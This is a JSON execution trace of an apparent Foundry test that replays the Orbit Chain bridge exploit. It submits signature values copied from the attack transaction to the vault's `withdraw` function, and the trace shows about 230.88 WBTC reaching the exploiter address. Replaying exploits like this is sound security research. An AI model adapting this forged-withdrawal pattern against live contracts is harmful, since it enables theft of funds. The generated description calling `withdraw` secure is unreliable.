[
    {
        "id": "433265",
        "args": "",
        "original_code": "    function testExploit() public {\n        deal(address(WBTC), orbitExploiterToAddr, 0);\n        emit log_named_decimal_uint(\n            \"Exploiter WBTC balance before attack\", WBTC.balanceOf(orbitExploiterToAddr), WBTC.decimals()\n        );\n        // At first exploiter has deposited some WBTC tokens (acquired from Uniswap) to Orbit in tx:\n        // https://explorer.phalcon.xyz/tx/eth/0x9d1351ca4ede8b36ca9cd9f9c46e3b08890d13d94dfd3074d9bb66bbcc2629b1\n\n        // Hash of the tx from Orbit chain. Details can be found at https://bridge.orbitchain.io/ explorer\n        bytes32 orbitTxHash = 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa;\n        bytes32[] memory bytes32s = new bytes32[](2);\n        bytes32s[0] = sha256(abi.encodePacked(orbitHubContractAddress, OrbitEthVault.chain(), address(OrbitEthVault)));\n        bytes32s[1] = orbitTxHash;\n\n        // Values specific to fake signatures from attack tx\n        uint256[] memory uints = new uint256[](3);\n        uints[0] = 23_087_900_000; // token withdraw amount\n        uints[1] = WBTC.decimals();\n        uints[2] = 8735; // unique identifier for requesting bridging ex, depositId\n\n        // v, r, s signature values from attack tx\n        uint8[] memory v = new uint8[](7);\n        v[0] = 27;\n        v[1] = 28;\n        v[2] = 28;\n        v[3] = 27;\n        v[4] = 28;\n        v[5] = 28;\n        v[6] = 27;\n\n        bytes32[] memory r = new bytes32[](7);\n        r[0] = 0x3ef06a27b3565a82b6d72af184ca3d787e3dd8fc0bd56bb0e7dce2faf920257d;\n        r[1] = 0xf1d81597f32c9376e90d22b9a1f121f1a99a1c191f8e930ed0de6df7b759a154;\n        r[2] = 0x3b7169e2ee2b73dcfbabae1400b811b95616cb5dc547b8b7b7c6aeb37b5b906b;\n        r[3] = 0xd4b7fd0617b28e1eeb018e1dbf924e662d1a0520cad96af2fcf496e16f4c58c6;\n        r[4] = 0xe06c17f1a6630bfa47f0fe0cfba02f40f0901e2412713e4c7f46ae17a25dc92c;\n        r[5] = 0xdecb2622da70fee1c343b93dc946eb855fd32c59b293c0765cb94a71e62aeff3;\n        r[6] = 0xff7c705149017ce467d05717eadb0a2718aedc7a1799ad153d05e8fc48be853e;\n\n        bytes32[] memory s = new bytes32[](7);\n        s[0] = 0x0cc266abfa2ba924ffa7dab0cd8f7bb1a14891ec74dea53927c09296d1c6ac7c;\n        s[1] = 0x739fe72bab59a2eead1e36fdf71441e0407332c508165e460a2cde5418858e1b;\n        s[2] = 0x18303ee09818b0575ea4a5c2ed25b1e78523aa2b387a9c7c9c23b0d906ff9e07;\n        s[3] = 0x37da521031f0a65dd8466d4def41c44a69796f696965c42f9705447286c0ac9a;\n        s[4] = 0x5443cf63033ab211f205076622b2426b994ce3706c1ee2464a68ef168c7639bb;\n        s[5] = 0x725fa18d06acb4f6f8a5b143bca088d76f77d9531765dea6799b484373d0641b;\n        s[6] = 0x6b6ddbaaafc5f0580b670ad9d0913ca4c60df2753151a499117086aa725cf2c7;\n\n        OrbitEthVault.withdraw(\n            orbitHubContractAddress,\n            \"ORBIT\",\n            abi.encodePacked(orbitExploiterFromAddr),\n            orbitExploiterToAddr,\n            address(WBTC),\n            bytes32s,\n            uints,\n            \"\",\n            v,\n            r,\n            s\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBTC balance after attack\", WBTC.balanceOf(orbitExploiterToAddr), WBTC.decimals()\n        );\n    }\n",
        "description": "1. **Core functions:**  \n   The `testExploit` function simulates an attack scenario where an exploiter attempts to withdraw WBTC (Wrapped Bitcoin) tokens from a vault contract (`OrbitEthVault`). The function first sets the exploiter's WBTC balance to zero and logs the balance before the attack. It then prepares data for the withdrawal, including transaction details, token amounts, and fake signatures. Finally, it calls the `withdraw` function on the vault contract to execute the withdrawal and logs the exploiter's WBTC balance after the attack.\n\n2. **Security mechanism:**  \n   The function does not include explicit security mechanisms like access control or validation checks. Instead, it relies on the `withdraw` function of the `OrbitEthVault` contract to handle security. The use of fake signatures (`v`, `r`, `s`) suggests that the function is testing or simulating an exploit scenario rather than implementing secure practices. Proper security measures would include validating signatures, ensuring only authorized users can call the function, and verifying the integrity of the data being passed.\n\n3. **Parameter Function:**  \n   - `orbitHubContractAddress`: The address of the hub contract involved in the transaction.  \n   - `\"ORBIT\"`: A string representing the chain or network identifier.  \n   - `abi.encodePacked(orbitExploiterFromAddr)`: Encodes the exploiter's address for the withdrawal.  \n   - `orbitExploiterToAddr`: The address where the withdrawn tokens will be sent.  \n   - `address(WBTC)`: The address of the WBTC token contract.  \n   - `bytes32s`: An array of hashed data, including the vault contract details and transaction hash.  \n   - `uints`: An array of numeric values, such as the withdrawal amount, token decimals, and a unique identifier.  \n   - `v`, `r`, `s`: Arrays of fake signature components used to simulate the withdrawal request.  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it emits two log events to display the exploiter's WBTC balance before and after the simulated attack. The balance is calculated using the `balanceOf` function of the WBTC token contract, which retrieves the token balance of the specified address (`orbitExploiterToAddr`). The decimals of the WBTC token are used to format the balance for readability.\n\nIn summary, the `testExploit` function simulates an attack scenario by preparing fake data and calling a withdrawal function on a vault contract. It logs the exploiter's WBTC balance before and after the attack but does not include explicit security measures, relying instead on the underlying contract's logic.",
        "return_value": "Returned"
    },
    {
        "id": "2795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "1208790 [1.208e6]"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "1208790 [1.208e6]"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]",
        "original_code": null,
        "description": null,
        "return_value": "[0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5], []"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000001271d6"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000001271d6"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "1208790 [1.208e6]"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5, 0x0000000000000000000000000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5, 0x00000000000000000000000000000000000000000000000000000000001271d6",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000001271d6"
    },
    {
        "id": "0",
        "args": "WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], 0x38df0fcd2c0a0df108cfe8a6ae4850ca1cdfd082e4b6cb9f9fdf3e7a2fa0f8b5, 0x0000000000000000000000000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "2431",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "8"
    },
    {
        "id": "1110",
        "args": "",
        "original_code": "",
        "description": "",
        "return_value": "\"ETH\""
    },
    {
        "id": "84",
        "args": "0xb5680a55d627c52de992e3ea52a86f19da4753994554481bf68a9d1eaee7826b3593c20a0ca93293cb489a",
        "original_code": null,
        "description": null,
        "return_value": "0x50f408f4b0fb17bf4f5143de4bd95802410d00422f008e9deef06fb101a0f060"
    },
    {
        "id": "431",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "8"
    },
    {
        "id": "128955",
        "args": "orbitHubContractAddress: [0xB5680a55d627c52DE992e3EA52a86f19DA475399], \"ORBIT\", 0x9263e7873613ddc598a701709875634819176aff, 0x9ca536d01B9E78dD30de9d7457867F8898634049, WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], [0x50f408f4b0fb17bf4f5143de4bd95802410d00422f008e9deef06fb101a0f060, 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa], [23087900000 [2.308e10], 8, 8735], 0x, [27, 28, 28, 27, 28, 28, 27], [0x3ef06a27b3565a82b6d72af184ca3d787e3dd8fc0bd56bb0e7dce2faf920257d, 0xf1d81597f32c9376e90d22b9a1f121f1a99a1c191f8e930ed0de6df7b759a154, 0x3b7169e2ee2b73dcfbabae1400b811b95616cb5dc547b8b7b7c6aeb37b5b906b, 0xd4b7fd0617b28e1eeb018e1dbf924e662d1a0520cad96af2fcf496e16f4c58c6, 0xe06c17f1a6630bfa47f0fe0cfba02f40f0901e2412713e4c7f46ae17a25dc92c, 0xdecb2622da70fee1c343b93dc946eb855fd32c59b293c0765cb94a71e62aeff3, 0xff7c705149017ce467d05717eadb0a2718aedc7a1799ad153d05e8fc48be853e], [0x0cc266abfa2ba924ffa7dab0cd8f7bb1a14891ec74dea53927c09296d1c6ac7c, 0x739fe72bab59a2eead1e36fdf71441e0407332c508165e460a2cde5418858e1b, 0x18303ee09818b0575ea4a5c2ed25b1e78523aa2b387a9c7c9c23b0d906ff9e07, 0x37da521031f0a65dd8466d4def41c44a69796f696965c42f9705447286c0ac9a, 0x5443cf63033ab211f205076622b2426b994ce3706c1ee2464a68ef168c7639bb, 0x725fa18d06acb4f6f8a5b143bca088d76f77d9531765dea6799b484373d0641b, 0x6b6ddbaaafc5f0580b670ad9d0913ca4c60df2753151a499117086aa725cf2c7]",
        "original_code": "    function withdraw(\n        address hubContract,\n        string memory fromChain,\n        bytes memory fromAddr,\n        bytes memory toAddr,\n        bytes memory token,\n        bytes32[] memory bytes32s,\n        uint[] memory uints,\n        uint8[] memory v,\n        bytes32[] memory r,\n        bytes32[] memory s\n    ) public onlyActivated {\n        require(bytes32s.length >= 1);\n        require(bytes32s[0] == sha256(abi.encodePacked(hubContract, chain, address(this))));\n        require(uints.length >= 2);\n        require(isValidChain[getChainId(fromChain)]);\n\n        bytes32 whash = sha256(abi.encodePacked(hubContract, fromChain, chain, fromAddr, toAddr, token, bytes32s, uints));\n\n        require(!isUsedWithdrawal[whash]);\n        isUsedWithdrawal[whash] = true;\n\n        uint validatorCount = _validate(whash, v, r, s);\n        require(validatorCount >= required);\n\n        address payable _toAddr = bytesToAddress(toAddr);\n        address tokenAddress = bytesToAddress(token);\n        if(tokenAddress == address(0)){\n            if(!_toAddr.send(uints[0])) revert();\n        }else{\n            if(tokenAddress == tetherAddress){\n                TIERC20(tokenAddress).transfer(_toAddr, uints[0]);\n            }\n            else{\n                if(!IERC20(tokenAddress).transfer(_toAddr, uints[0])) revert();\n            }\n        }\n\n        emit Withdraw(hubContract, fromChain, chain, fromAddr, toAddr, token, bytes32s, uints);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `withdraw` function is designed to process withdrawal requests in a decentralized system. It verifies the authenticity of the request, ensures the withdrawal hasn't been processed before, and transfers funds or tokens to the specified recipient address. The function handles both native cryptocurrency (like Ether) and ERC20 tokens, including a specific case for Tether (USDT). It also emits an event to log the withdrawal details for transparency.\n\n2. **Security mechanism:**  \n   - **`onlyActivated` modifier:** Ensures the function can only be called if the contract is in an active state.  \n   - **`require` statements:** Validate the input data, such as ensuring the correct hash matches, the chain ID is valid, and the withdrawal hasn't been used before.  \n   - **Signature validation (`_validate`):** Confirms the withdrawal request is signed by a sufficient number of validators to prevent unauthorized access.  \n   - **Reentrancy prevention:** Uses a simple `send` and `transfer` for native currency and `transfer` for ERC20 tokens, which inherently limit gas and reduce reentrancy risks.  \n   - **Hash uniqueness check (`isUsedWithdrawal`):** Ensures each withdrawal request is processed only once.  \n\n3. **Parameter Function:**  \n   - **`hubContract`:** The address of the hub contract initiating the withdrawal.  \n   - **`fromChain`:** The blockchain from which the withdrawal originates.  \n   - **`fromAddr`:** The sender's address on the originating chain.  \n   - **`toAddr`:** The recipient's address on the current chain.  \n   - **`token`:** The token or currency being withdrawn.  \n   - **`bytes32s`:** An array of data used for validation, including a hash to verify the request.  \n   - **`uints`:** An array of numeric values, typically including the withdrawal amount.  \n   - **`v`, `r`, `s`:** Components of the validator signatures used to authenticate the withdrawal request.  \n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it performs actions based on the input parameters:  \n   - It validates the withdrawal request using the provided data and signatures.  \n   - If the request is valid, it transfers the specified amount of funds or tokens to the recipient address.  \n   - If the transfer fails (e.g., due to insufficient balance or other issues), the function reverts the transaction.  \n   - Finally, it emits a `Withdraw` event to record the transaction details.  \n\nIn summary, the `withdraw` function securely processes withdrawal requests by validating inputs, ensuring uniqueness, and transferring funds or tokens to the intended recipient. It incorporates multiple security measures to prevent unauthorized or duplicate transactions.",
        "return_value": "Returned"
    },
    {
        "id": "123008",
        "args": "orbitHubContractAddress: [0xB5680a55d627c52DE992e3EA52a86f19DA475399], \"ORBIT\", 0x9263e7873613ddc598a701709875634819176aff, 0x9ca536d01B9E78dD30de9d7457867F8898634049, WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599], [0x50f408f4b0fb17bf4f5143de4bd95802410d00422f008e9deef06fb101a0f060, 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa], [23087900000 [2.308e10], 8, 8735], 0x, [27, 28, 28, 27, 28, 28, 27], [0x3ef06a27b3565a82b6d72af184ca3d787e3dd8fc0bd56bb0e7dce2faf920257d, 0xf1d81597f32c9376e90d22b9a1f121f1a99a1c191f8e930ed0de6df7b759a154, 0x3b7169e2ee2b73dcfbabae1400b811b95616cb5dc547b8b7b7c6aeb37b5b906b, 0xd4b7fd0617b28e1eeb018e1dbf924e662d1a0520cad96af2fcf496e16f4c58c6, 0xe06c17f1a6630bfa47f0fe0cfba02f40f0901e2412713e4c7f46ae17a25dc92c, 0xdecb2622da70fee1c343b93dc946eb855fd32c59b293c0765cb94a71e62aeff3, 0xff7c705149017ce467d05717eadb0a2718aedc7a1799ad153d05e8fc48be853e], [0x0cc266abfa2ba924ffa7dab0cd8f7bb1a14891ec74dea53927c09296d1c6ac7c, 0x739fe72bab59a2eead1e36fdf71441e0407332c508165e460a2cde5418858e1b, 0x18303ee09818b0575ea4a5c2ed25b1e78523aa2b387a9c7c9c23b0d906ff9e07, 0x37da521031f0a65dd8466d4def41c44a69796f696965c42f9705447286c0ac9a, 0x5443cf63033ab211f205076622b2426b994ce3706c1ee2464a68ef168c7639bb, 0x725fa18d06acb4f6f8a5b143bca088d76f77d9531765dea6799b484373d0641b, 0x6b6ddbaaafc5f0580b670ad9d0913ca4c60df2753151a499117086aa725cf2c7]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "72",
        "args": "0x1bf68a9d1eaee7826b3593c20a0ca93293cb489a4f52424954",
        "original_code": null,
        "description": null,
        "return_value": "0xb18557931ff79edd3f4f9f4679b4538562f57b62aadb370d1b78a81df9dd56bb"
    },
    {
        "id": "72",
        "args": "0x1bf68a9d1eaee7826b3593c20a0ca93293cb489a4f52424954",
        "original_code": null,
        "description": null,
        "return_value": "0xb18557931ff79edd3f4f9f4679b4538562f57b62aadb370d1b78a81df9dd56bb"
    },
    {
        "id": "84",
        "args": "0xb5680a55d627c52de992e3ea52a86f19da4753994554481bf68a9d1eaee7826b3593c20a0ca93293cb489a",
        "original_code": null,
        "description": null,
        "return_value": "0x50f408f4b0fb17bf4f5143de4bd95802410d00422f008e9deef06fb101a0f060"
    },
    {
        "id": "72",
        "args": "0x1bf68a9d1eaee7826b3593c20a0ca93293cb489a4f52424954",
        "original_code": null,
        "description": null,
        "return_value": "0xb18557931ff79edd3f4f9f4679b4538562f57b62aadb370d1b78a81df9dd56bb"
    },
    {
        "id": "156",
        "args": "0xb5680a55d627c52de992e3ea52a86f19da4753994f524249544554489263e7873613ddc598a701709875634819176aff9ca536d01b9e78dd30de9d7457867f88986340492260fac5e5542a773aa44fbcfedf7c193bc2c59950f408f4b0fb17bf4f5143de4bd95802410d00422f008e9deef06fb101a0f060f7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa00000000000000000000000000000000000000000000000000000005602565600000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000221f",
        "original_code": null,
        "description": null,
        "return_value": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 27, 28468172563146432138467096657209299556338359152284195833463470884987896604029, 5771231128190489836589073804115472419125633980303676192752229758456906034300",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000a6dc28cbcb2f8060a00b4fa67f9b67775ac5a3a1"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 28, 109389184507793784346642101993032143682288471935559220549526618978131012854100, 52298501751104489252930331723237095356268387493578285021930848892690121461275",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000008a3f117ef3b40f1661dedf7f28fc33e7b6fae4f8"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 28, 26886842586129234904627543049498536424186742458186371306350579007483803308139, 10940750988426934955966816651611706121252247659005276951033375137250846678535",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000001c0cd56f1c3e2cf13b9b44dbe5529104bade543e"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 27, 96215403218587972723455803151950228964595399632793711617415405244830442084550, 25262945712020222551010227077216559313821852464398054328117540875424130706586",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000007f4b332611818ae13c76f9222e2229f274ded9bd"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 28, 101509062820683445371623020482972225365581428950116190157647733198239083383084, 38114089365203116906762390111942525214225787622632232665356418211987835992507",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000003924ac70075078a7713f543b72e3f8817ecec646"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 28, 100772385545639078253078513928730447459722328266515881443817793584114432667635, 51732630192863549379967316560348799606099154370827233738976852019377142260763",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000003b6590ff12ba188e465395e1610d8368613054b0"
    },
    {
        "id": "3000",
        "args": "0x8df324c6d9450793ff2e0e75391e0b3117f55bfdd6d377974e6797ffbf7b763d, 27, 115559640611800378636398202191588610079896249021745910022620806591280662349118, 48591577212622306356189218529280706368723866238728040751254479990503451194055",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000067c3c784c49d9ab8757adb71491df1a1b38fbfa8"
    },
    {
        "id": "2795",
        "args": "OrbitEthVault: [0x1Bf68A9d1EaEe7826b3593C20a0ca93293cb489a]",
        "original_code": null,
        "description": null,
        "return_value": "28760310355 [2.876e10]"
    },
    {
        "id": "6903",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049, 23087900000 [2.308e10]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "795",
        "args": "0x9ca536d01B9E78dD30de9d7457867F8898634049",
        "original_code": null,
        "description": null,
        "return_value": "23087900000 [2.308e10]"
    },
    {
        "id": "431",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "8"
    }
]